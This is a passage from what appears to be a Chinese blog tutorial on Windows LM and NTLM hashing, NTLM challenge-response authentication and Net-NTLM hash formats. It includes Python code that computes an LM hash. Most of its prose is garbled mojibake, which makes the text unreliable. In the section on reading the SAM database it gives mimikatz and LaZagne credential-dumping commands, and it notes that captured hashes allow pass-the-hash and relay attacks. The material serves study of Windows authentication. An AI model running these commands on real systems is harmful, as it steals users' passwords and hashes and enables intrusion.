class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># ç”¨æˆ·çš„å¯†ç è½¬æ¢ä¸ºå¤§å†™,å¹¶è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line">    <span class="comment"># å¯†ç ä¸è¶³14å­—èŠ‚å°†ä¼šç”¨0æ¥è¡¥å…¨</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># å›ºå®šé•¿åº¦çš„å¯†ç è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># æ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä½56bitï¼Œé•¿åº¦ä¸è¶³ä½¿ç”¨0åœ¨å·¦è¾¹è¡¥é½é•¿åº¦</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># å†åˆ†7bitä¸ºä¸€ç»„æœ«å°¾åŠ 0ï¼Œç»„æˆæ–°çš„ç¼–ç </span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line">    <span class="comment"># ä¸Šæ­¥éª¤å¾—åˆ°çš„8byteäºŒç»„ï¼Œåˆ†åˆ«ä½œä¸ºDES keyä¸º&quot;KGS!@#$%&quot;è¿›è¡ŒåŠ å¯†ã€‚</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line">    <span class="comment"># å°†äºŒç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œå¾—åˆ°æœ€ç»ˆLM HASHå€¼ã€‚</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="LM-Hash-ç¼ºç‚¹"><a href="#LM-Hash-ç¼ºç‚¹" class="headerlink" title="LM Hash ç¼ºç‚¹"></a>LM Hash ç¼ºç‚¹</h4><ul>
<li>1.å¯†ç é•¿åº¦æœ€å¤§åªèƒ½ä¸º14ä¸ªå­—ç¬¦</li>
<li>2.å¯†ç æ— æ³•åŒºåˆ†å¤§å°å†™ï¼Œåœ¨ç”Ÿæˆå“ˆå¸Œå€¼ä¹‹å‰ï¼Œæ‰€æœ‰å¯†ç éƒ½å°†è½¬æ¢ä¸ºå¤§å†™</li>
<li>3.å¦‚æœå¯†ç å¼ºåº¦å°äº7ä½ï¼Œé‚£ä¸ªç¬¬äºŒä¸ªåˆ†ç»„åŠ å¯†åçš„ç»“æœä¸€å®šä¸º aad3b435b51404ee</li>
<li>4.Des å®¹æ˜“è¢«ç ´è§£ å¯†ç å¼ºåº¦ä¸é«˜</li>
</ul>
<p>åœ¨Windows Vista å’Œ Windows Server 2008 ç‰ˆæœ¬å Windowsé»˜è®¤ç¦ç”¨äº†LM Hashã€‚LM-Hash æ˜æ–‡å¯†ç é™åˆ¶åœ¨14ä½ä»¥å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœLM Hashè¢«ç¦ç”¨äº†ï¼Œæ”»å‡»è€…é€šè¿‡å·¥å…·æŠ“å–çš„LM Hash é€šå¸¸ä¸º <code>aad3b435b51404eeaad3b435b51404ee</code></p>
<hr>
<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>LM Hash çš„è„†å¼±æ€§æ˜¾è€Œæ˜“è§ï¼Œæ‰€ä»¥å¾®è½¯äº1993å¹´åœ¨Windows NT 3.1ä¸­å¼•å…¥äº†NTLMåè®®ã€‚<br>NT LAN Manager (NTML) Hash æ˜¯åŸºäºMD4ç®—æ³•ã€‚ä»Windows Vista/Windows Server 2003ä»¥åWindowsçš„é»˜è®¤è®¤è¯æ–¹å¼å‡ä¸ºNTLM Hashã€‚</p>
<h4 id="NTLM-Hashç”ŸæˆåŸç†"><a href="#NTLM-Hashç”ŸæˆåŸç†" class="headerlink" title="NTLM Hashç”ŸæˆåŸç†"></a>NTLM Hashç”ŸæˆåŸç†</h4><ul>
<li>1.å°†ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li>
<li>2.å°†åå…­è¿›åˆ¶æ ¼å¼çš„å¯†ç è½¬æ¢æˆUnicodeæ ¼å¼ï¼Œå³åœ¨æ¯ä¸ªå­—èŠ‚ä¹‹åæ·»åŠ 0x00</li>
<li>3.ä½¿ç”¨MD4æ‘˜è¦ç®—æ³•å¯¹Unicodeç¼–ç æ•°æ®è¿›è¡ŒHashè®¡ç®—</li>
</ul>
<p>ä»¥å¯†ç 123456ä¸ºä¾‹ ï¼Œ</p>
<ul>
<li>  é¦–å…ˆå°†å¯†ç å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œ123456 =&gt; 31 32 33 34 35 36</li>
<li>  å†è¿›è¡ŒUnicode ç¼–ç ï¼Œ 31 32 33 34 35 36 =&gt; 310032003300340035003600</li>
<li>  è¿›è¡Œmd4åŠ å¯†</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>




<hr>
<h2 id="NTLM-è®¤è¯"><a href="#NTLM-è®¤è¯" class="headerlink" title="NTLM è®¤è¯"></a>NTLM è®¤è¯</h2><p>NTLMè®¤è¯ Windows çš„ NTLM è®¤è¯å°±æ˜¯åˆ©ç”¨ NTLM Hash è¿›è¡Œçš„è®¤è¯ï¼Œå¯ä»¥åˆ†ä¸º <code>æœ¬åœ°è®¤è¯</code> å’Œ <code>ç½‘ç»œè®¤è¯</code> ä¸¤ç§æ–¹å¼ã€‚NTLM çš„ç½‘ç»œè®¤è¯ï¼Œæ—¢å¯ç”¨äºåŸŸå†…çš„è®¤è¯æœåŠ¡ï¼Œåˆå¯ç”¨äºå·¥ä½œç»„ç¯å¢ƒã€‚NTLM æœ‰ <code>NTLMv1</code> ã€<code>NTLMv2</code> ã€<code>NTLMsession v2</code> ä¸‰ä¸ªç‰ˆæœ¬ï¼Œç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯NTLMv2ç‰ˆæœ¬ã€‚</p>
<h3 id="NTLMæœ¬åœ°è®¤è¯"><a href="#NTLMæœ¬åœ°è®¤è¯" class="headerlink" title="NTLMæœ¬åœ°è®¤è¯"></a>NTLMæœ¬åœ°è®¤è¯</h3><p>æœ¬åœ°è®¤è¯é‡‡ç”¨sam hashæ¯”å¯¹çš„å½¢å¼æ¥åˆ¤æ–­ç”¨æˆ·å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œè®¡ç®—æœºæœ¬åœ°ç”¨æˆ·çš„æ‰€æœ‰å¯†ç è¢«åŠ å¯†å­˜å‚¨åœ¨  <code>%SystemRoot%\system32\config\sam</code>  æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶æ›´åƒæ˜¯ä¸€ä¸ªå­˜å‚¨ç”¨æˆ·å¯†ç çš„æ•°æ®åº“ã€‚</p>
<p>åœ¨è¿›è¡Œæœ¬åœ°è®¤è¯çš„è¿‡ç¨‹ä¸­ï¼Œå½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿå°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç åŠ å¯†æˆ  <em><code>NTLM Hash</code></em> ï¼Œä¸ SAMæ•°æ®åº“ä¸­çš„  <em><code>NTLM Hash</code></em>  è¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œå®ç°è®¤è¯ã€‚</p>
<h4 id="NTLMæœ¬åœ°è®¤è¯è¯¦ç»†æµç¨‹"><a href="#NTLMæœ¬åœ°è®¤è¯è¯¦ç»†æµç¨‹" class="headerlink" title="NTLMæœ¬åœ°è®¤è¯è¯¦ç»†æµç¨‹"></a>NTLMæœ¬åœ°è®¤è¯è¯¦ç»†æµç¨‹</h4><blockquote>
<p>winlogon.exeå³Windows Logon Processï¼Œæ˜¯Windows NTç”¨æˆ·ç™»é™†ç¨‹åºï¼Œç”¨äºç®¡ç†ç”¨æˆ·ç™»å½•å’Œé€€å‡ºã€‚<br>LSASSç”¨äºå¾®è½¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ã€‚å®ƒç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ã€‚</p>
</blockquote>
<ul>
<li>  å½“ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œæ“ä½œç³»ç»Ÿä¼šè®© <code>winlogon.exe</code> æ˜¾ç¤ºç™»é™†ç•Œé¢</li>
<li>  å½“winlogon.exeæ¥æ”¶åˆ°è´¦å·å¯†ç è¾“å…¥ä¹‹åï¼Œä¼šå°†å¯†ç äº¤ç»™lsassè¿›ç¨‹</li>
<li>  å°†æ˜æ–‡å¯†ç åŠ å¯†æˆNTLM Hash</li>
<li>  ä¸SAMæ•°æ®åº“æ¯”è¾ƒè®¤è¯</li>
</ul>
<h4 id="è¯»å–SAMä¸­æ–‡ä»¶çš„NTLM-Hash"><a href="#è¯»å–SAMä¸­æ–‡ä»¶çš„NTLM-Hash" class="headerlink" title="è¯»å–SAMä¸­æ–‡ä»¶çš„NTLM Hash"></a>è¯»å–SAMä¸­æ–‡ä»¶çš„NTLM Hash</h4><p>å¦‚æœæƒ³è¦è¯»å–SAMæ–‡ä»¶çš„è¯ï¼Œéœ€è¦å€ŸåŠ©ä¸€äº›å·¥å…·æ¥è¯»å–NTLMä¸­çš„hashå€¼<br><img src="/posts/5f88ecbb/20220424101819.png"></p>
<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>æ³¨æ„ï¼š</p>
<ul>
<li>  éœ€è¦ç®¡ç†å‘˜æƒé™</li>
<li>  å½“æœºå™¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚</li>
</ul>
<p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot;</code></p>
<p><img src="/posts/5f88ecbb/20220424103059.png"></p>
<h5 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h5><p>æ³¨æ„ï¼šéœ€è¦ç®¡ç†å‘˜æƒé™</p>
<p><code>lazagne.exe all</code><br><img src="/posts/5f88ecbb/20220424102700.png"></p>
<hr>
<h3 id="NTLMç½‘ç»œè®¤è¯"><a href="#NTLMç½‘ç»œè®¤è¯" class="headerlink" title="NTLMç½‘ç»œè®¤è¯"></a>NTLMç½‘ç»œè®¤è¯</h3><p>NTLMæ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå®ƒæ˜¯åŸºäºæŒ‘æˆ˜ï¼ˆChalengeï¼‰/å“åº”ï¼ˆResponseï¼‰è®¤è¯æœºåˆ¶çš„ä¸€ç§è®¤è¯æ¨¡å¼ã€‚(è¿™ä¸ªåè®®åªæ”¯æŒWindows)ï¼Œç”±ä¸‰ç§æ¶ˆæ¯ç»„æˆï¼šé€šå¸¸ç§°ä¸º<code>type 1(åå•†)</code>ï¼Œ<code>ç±»å‹type 2(è´¨è¯¢)</code>å’Œ<code>type 3(èº«ä»½éªŒè¯)</code>ã€‚</p>
<ul>
<li>  åå•† ä¸»è¦ç”¨äºç¡®è®¤åŒæ–¹åè®®ç‰ˆæœ¬(NTLM v1/NTLM V2)</li>
<li>  è´¨è¯¢ å°±æ˜¯æŒ‘æˆ˜ï¼ˆChallengeï¼‰/å“åº”ï¼ˆResponseï¼‰è®¤è¯æœºåˆ¶èµ·ä½œç”¨çš„èŒƒç•´ã€‚</li>
<li>  éªŒè¯ éªŒè¯ä¸»è¦æ˜¯åœ¨è´¨è¯¢å®Œæˆåï¼ŒéªŒè¯ç»“æœï¼Œæ˜¯è®¤è¯çš„æœ€åä¸€æ­¥ã€‚</li>
</ul>
<p><img src="/posts/5f88ecbb/8b8495805c013d2a45020dc199a53ca0.png"></p>
<ul>
<li><p>1.ç”¨æˆ·ç™»å½•å®¢æˆ·ç«¯ç”µè„‘</p>
</li>
<li><p>2.ï¼ˆType1 åå•†ï¼‰ å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€Type1(åå•†æ¶ˆæ¯)ã€‚ ä¸»è¦åŒ…å«å®¢æˆ·ç«¯æ”¯æŒå’ŒæœåŠ¡å™¨è¯·æ±‚çš„åŠŸèƒ½åˆ—è¡¨</p>
</li>
<li><p>3.ï¼ˆType2 å“åº”ï¼‰ æœåŠ¡å™¨ç”¨Type2æ¶ˆæ¯(è´¨è¯¢)è¿›è¡Œå“åº”ï¼Œå°†ä¼ è¾“æ•°æ®ä¼ ç»™NTLM SSPè¿›è¡Œå¤„ç†ï¼Œç„¶åè¿”å›ä¸€ä¸ª16ä¸ºéšæœºå€¼(ç§°ä¸º<code>challenge</code>)ï¼Œå°†å…¶å‘é€ç»™å®¢æˆ·ç«¯å¹¶åœ¨æœ¬åœ°ç¼“å­˜è¯¥<code>challenge</code>ã€‚</p>
</li>
<li><p>4.ï¼ˆType3 èº«ä»½è®¤è¯ï¼‰ å®¢æˆ·ç«¯ç”¨Type3æ¶ˆæ¯(èº«ä»½éªŒè¯)å›å¤è´¨è¯¢ã€‚å®¢æˆ·ç«¯æ¥æ”¶åˆ°è¿‡ç¨‹3ä¸­çš„<code>challenge</code>åï¼Œä½¿ç”¨ç”¨æˆ·hashä¸æœ¬åœ°ç¼“å­˜çš„<code>challenge</code>è¿›è¡ŒåŠ å¯†è¿ç®—å¾—åˆ°<code>response</code>ï¼ˆNet-NTLM Hash1ï¼‰ï¼Œå°†<code>responseï¼Œusernameï¼Œchallenge</code>å°è£…åä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ã€‚</p>
</li>
<li><p>å…¶ä¸­çš„<code>response</code> æœ€ä¸ºå…³é”®ï¼Œå› ä¸ºå®ƒä»¬åƒæœåŠ¡å™¨è¯æ˜å®¢æˆ·ç«¯ç”¨æˆ·å·²ç»çŸ¥é“äº†è´¦æˆ·çš„å¯†ç ã€‚</p>
</li>
<li><ol start="5">
<li> æœåŠ¡å™¨æ‹¿åˆ°Type3ï¼ˆè®¤è¯æ¶ˆæ¯ï¼‰ä¹‹åï¼Œä¼šä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„<code>challenge</code>å’Œç”¨æˆ·hashè¿›è¡ŒåŠ å¯†å¾—åˆ°<code>response2</code>ï¼ˆNet-NTLM Hash2ï¼‰Type3å‘æ¥çš„<code>response</code>(Net-NTLM Hash1)è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœåŒ¹é…åˆ™è®¤è¯é€šè¿‡  </li>
</ol>
</li>
<li><p>ã€å¦‚æœç”¨æˆ·hashæ˜¯å­˜å‚¨åœ¨åŸŸæ§é‡Œé¢çš„è¯ï¼Œé‚£ä¹ˆæ²¡æœ‰ç”¨æˆ·hashå°±æ²¡åŠæ³•å»è®¡ç®—response2ã€‚ä¹Ÿå°±æ²¡æ³•éªŒè¯ã€‚è¿™æ—¶ç”¨æˆ·æœåŠ¡å™¨å°±ä¼šé€šè¿‡NetLogonåè®®ç»ƒä¹ ç”¨æˆ·å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ç„¶åå°†Type1ï¼ŒType2ï¼ŒType3å…¨éƒ¨å‘ç»™åŸŸæ§(è¿™ä¸ªè¿‡ç¨‹ä¹Ÿå« <code>Pass Through Authentication</code> è®¤è¯æµç¨‹)ã€‘</p>
</li>
<li><p>6.åŸŸæ§ä½¿ç”¨challengeå’Œç”¨æˆ·çš„Hashè¿›è¡ŒåŠ å¯†å¾—åˆ° <code>response2</code> ä¸Type3çš„<code>response</code>è¿›è¡Œæ¯”è¾ƒ</p>
</li>
</ul>
<p><img src="/posts/5f88ecbb/99f58b1ec9929b60acbfe3a7f879f37c.jpg"><br>åœ¨åŸŸç¯å¢ƒä¸‹ï¼Œ<code>NTLM</code>çš„è®¤è¯æ–¹å¼ä¸ä¸Šé¢åŸºæœ¬ç›¸åŒï¼Œå”¯ä¸€ä¸åŒç‚¹æ˜¯ç¬¬5æ­¥ï¼ŒæœåŠ¡ç«¯ä¼šå‘åŸŸæ§è¯·æ±‚æ ¡éªŒã€‚<br><img src="/posts/5f88ecbb/25722010906bb6021175f8bbb23a32f0.jpg"></p>
<p>åœ¨è¿™é‡Œï¼Œå¦‚æœæˆ‘ä»¬è·å¾—äº†NTLM-Hashï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡ŒPTHæ”»å‡»ï¼Œä½†ä¸èƒ½ç”¨æ¥Relayï¼›è€Œå¦‚æœæˆ‘ä»¬è·å¾—äº†Net NTLM-Hashï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œçˆ†åŠ›ç ´è§£å¾—åˆ°æ˜æ–‡ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨Net NTLM-Hashè¿›è¡Œä¸­ç»§æ”»å‡»ã€‚</p>
<p>æ³¨æ„:</p>
<ul>
<li><code>Challenge</code> æ˜¯ Serveräº§ç”Ÿçš„ä¸€ä¸ª16å­—èŠ‚çš„éšæœºæ•°ï¼Œå†æ¯æ¬¡è®¤è¯æ—¶éƒ½ä¸åŒã€‚</li>
<li><code>Response</code> çš„è¡¨ç°å½¢å¼ä¸ºNet-NTLM Hashï¼Œä»–æ˜¯æœ‰å®¢æˆ·ç«¯æä¾›å¯†ç HashåŠ å¯†Serverè¿”å›çš„Challengeäº§ç”Ÿçš„ç»“æœã€‚</li>
</ul>
<p>ç®€å•çš„è¯´å°±æ˜¯</p>
<ol>
<li>åå•†<br>å®¢æˆ·ç«¯å‘é€åå•†æ¶ˆæ¯ï¼ˆåŒ…å«ç”¨æˆ·çš„NTLM Hashï¼‰ç»™æœåŠ¡ç«¯ã€‚</li>
</ol>
<p>2.å“åº”<br>æœåŠ¡ç«¯æ”¶åˆ°åå•†æ¶ˆæ¯å ç”Ÿæˆä¸€ä¸ª<code>challenge</code> å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå¹¶åœ¨æœ¬åœ°ç¼“å­˜<code>challenge</code>æ–¹ä¾¿åç»­è®¤è¯æ—¶è¿›è¡Œå¯¹æ¯”ã€‚</p>
<p>3.èº«ä»½è®¤è¯<br>å®¢æˆ·ç«¯æ”¶åˆ°<code>challenge</code> åï¼Œå°†<code>challenge</code>ä¸æœ¬åœ°hashåŠ å¯†å¾—åˆ°<code>response</code> ï¼Œå°†<code>response</code>ä¸usernameã€<code>challenge</code>ç­‰ä¸€èµ·å°è£…åå‘é€ç»™æœåŠ¡ç«¯;<br>æœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„è®¤è¯æ¶ˆæ¯åï¼Œå°†æœ¬åœ°ç¼“å­˜çš„<code>challenge</code>ä¸ç”¨æˆ·HashåŠ å¯†å¾—åˆ°<code>response2</code> ä¸ å‘æ¥çš„<code>response</code>è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœåŒ¹é…é‚£ä¹ˆè®¤è¯å°±é€šè¿‡ã€‚</p>
<hr>
<h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><p>Net-NTLM Hash ä¸ NTLM Hash ä¸ä¸€æ ·ã€‚NTLM è®¤è¯çš„ç¬¬ä¸‰æ­¥ä¸­ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯è¿”å›çš„ TYPE 2 æ¶ˆæ¯åï¼Œ ä¼šè¯»å–å‡ºæœåŠ¡ç«¯æ‰€æ”¯æŒçš„å†…å®¹ï¼Œå¹¶å–å‡ºå…¶ä¸­çš„éšæœºå€¼ <code>Challenge</code>ï¼Œç”¨ç¼“å­˜çš„æœåŠ¡å™¨ç«¯å¯†ç çš„ NTLM-Hash å¯¹å…¶è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸ç”¨æˆ·åã€Challenge ç­‰ä¸€èµ·ç»„åˆå¾—åˆ° Net-NTLM Hashï¼Œæœ€åå°† Net NTLM Hashå°è£…åˆ° TYPE 3 Authenticateæ¶ˆæ¯ä¸­ï¼Œå‘å¾€æœåŠ¡ç«¯ã€‚<br>ä¹Ÿå°±æ˜¯è¯´ Net-NTLM Hash æ˜¯ç½‘ç»œç¯å¢ƒä¸‹ NTLM è®¤è¯çš„æ•£åˆ—å€¼ã€‚NTLM v1 å“åº”å’Œ NTLM v2 å“åº”å¯¹åº”çš„å°±æ˜¯ Net-NTLM Hash åˆ†ä¸º <code>Net-NTLM Hash v1</code> å’Œ <code>Net-NTLM Hash v2</code>ã€‚<br>NTLM æœ‰ <code>NTLMv1</code> ã€<code>NTLMv2</code> ã€<code>NTLMsession v2</code> ä¸‰ä¸ªç‰ˆæœ¬ï¼Œç›®å‰ä½¿ç”¨æœ€å¤šçš„æ˜¯NTLMv2ç‰ˆæœ¬ã€‚</p>
<p>åœ¨Type3ä¸­çš„å“åº”ï¼Œæœ‰å…­ç§ç±»å‹ï¼Œè¿™å…­ç§çš„åŠ å¯†æµç¨‹éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åœ¨äºChallengeå’ŒåŠ å¯†ç®—æ³•ã€‚</p>
<ul>
<li>LMå“åº”ï¼ˆLAN Managerï¼‰ç”±å¤§å¤šè¾ƒæ—©çš„å®¢æˆ·ç«¯å‘é€ï¼ˆâ€œåŸå§‹â€å“åº”ç±»å‹ï¼‰</li>
<li>NTLM v1å“åº”  åŸºäºNTå®¢æˆ·ç«¯å‘é€çš„ï¼ŒåŒ…æ‹¬Windows 2000å’Œ XP</li>
<li>NTLM v2å“åº”  åœ¨Windows NTService Pack4 ä¸­å¼•å…¥ä¸€ç§è¾ƒæ–°çš„å“åº”ç±»å‹ï¼Œä»–æ›¿æ¢å¯ç”¨äº†NTLMç‰ˆæœ¬2çš„ç³»ç»Ÿä¸Šçš„NTLMå“åº”</li>
<li>LM v2å“åº”  æ›¿ä»£NTLMç‰ˆæœ¬2ç³»ç»Ÿä¸Šçš„LMå“åº”</li>
<li>NTLM2ä¼šè¯å“åº”(NTLM Mession v2) ç”¨äºåœ¨æ²¡æœ‰NTLMv2èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹åå•†NTLM2ä¼šè¯ã€å®‰å…¨æ€§æ—¶ï¼Œæ­¤æ–¹æ¡ˆä¼šæ›´æ”¹LM NTLM å“åº”çš„è¯­ä¹‰</li>
<li>åŒ¿åå“åº”  å½“åŒ¿åä¸Šä¸‹åˆæ­£åœ¨å»ºç«‹æ—¶ä½¿ç”¨ï¼Œæ²¡æœ‰æä¾›å®é™…çš„è¯ä¹¦ï¼Œä¹Ÿæ²¡æœ‰çœŸæ­£çš„èº«ä»½éªŒè¯ã€‚</li>
</ul>
<p>ä¸‹é¢ä¾§é‡è®²<code>NTLM v1</code>å“åº” å’Œ <code>NTLM v2</code>å“åº”ï¼š</p>
<ul>
<li>v1æ˜¯8ä½çš„<code>challenge</code>ï¼Œv2æ˜¯16ä½çš„<code>challenge</code></li>
<li>v1åŠ å¯†ç®—æ³•ï¼šå°†16ä½å­—èŠ‚çš„NTLM Hashå¡«ç©ºä½21ä¸ªå­—èŠ‚ï¼Œç„¶ååˆ†æˆ3ç»„ï¼Œæ¯ç»„7ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥<code>3DES</code> åŠ å¯†ç®—æ³•çš„ä¸‰ç»„å¯†é’¥ï¼ŒåŠ å¯†Serverå‘é€è¿‡æ¥çš„<code>challenge</code> ã€‚å°†è¿™ä¸‰ä¸ªå¯†æ–‡å€¼è¿æ¥èµ·æ¥å¾—åˆ°<code>response</code></li>
<li>v2åŠ å¯†ç®—æ³•ï¼š</li>
<li>å°†Unicodeåçš„å¤§å†™ç”¨æˆ·åå’ŒUnicodeåçš„èº«ä»½éªŒè¯ç›®æ ‡æ‹¼æ¥åœ¨ä¸€èµ·ã€‚ç”¨æˆ·åè½¬æ¢ä¸ºå¤§å†™ä¹ˆäººèº«ä»½éªŒè¯ç›®æ ‡åŒºåˆ†å¤§å°å†™ï¼Œå¹¶ä¸”å¿…é¡»ä¸ TargetName å­—ç¬¦æŒ‰ä¸­æ˜¾ç¤ºçš„å¤§å°å†™åŒ¹é…ã€‚å°†16å­—èŠ‚NTLMHashä½œä¸ºå¯†é’¥ï¼Œå¾—åˆ°ä¸€ä¸ªå€¼ã€‚<ul>
<li>æ„å»ºä¸€ä¸ª<code>blob</code>ä¿¡æ¯<ul>
<li>![679c9723c13d91a1d4a8329cbf0b40f2.png]</li>
</ul>
</li>
<li> ä½¿ç”¨16å­—èŠ‚çš„NTLM v2 HAshä½œä¸ºå¯†é’¥ï¼Œå°†HMAC-MD5æ¶ˆæ¯è®¤è¯ä»£ç ç®—æ³• åŠ å¯†ä¸€ä¸ªå€¼ã€‚å¾—åˆ°ä¸€ä¸ª16å­—èŠ‚çš„NTProofStr.</li>
<li>å°† NTProofStr ä¸ Blob æ‹¼æ¥èµ·æ¥å¾—åˆ° <code>response</code><br> å¯¹ä¸é€‰æ‹©å“ªä¸ªç‰ˆæœ¬çš„å“åº”æ˜¯ç”±<code>LmCompatibilityLevel</code>å†³å®šçš„ã€‚</li>
</ul>
</li>
</ul>
<p>Challenge/ResponseéªŒè¯æœºåˆ¶zhongtype3 responseé‡Œé¢åŒ…å«Net-ntlm hashï¼ŒNTLM v1å“åº”å’ŒNTLMv2å“åº”å¯¹åº”çš„å°±æ˜¯Net-ntlm hashåˆ†ä¸º<code>Net-ntlm hash v1</code>å’Œ<code>Net-ntlm hash v2</code>ã€‚</p>
<p>Net-NTLM Hash v1çš„æ ¼å¼ä¸ºï¼š</p>
<p><code>username::hostname:LM response:NTLM response:challenge</code></p>
<p>Net-NTLM Hash v2çš„æ ¼å¼ä¸ºï¼š</p>
<p><code>username::domain:challenge:HMAC-MD5:blob</code></p>
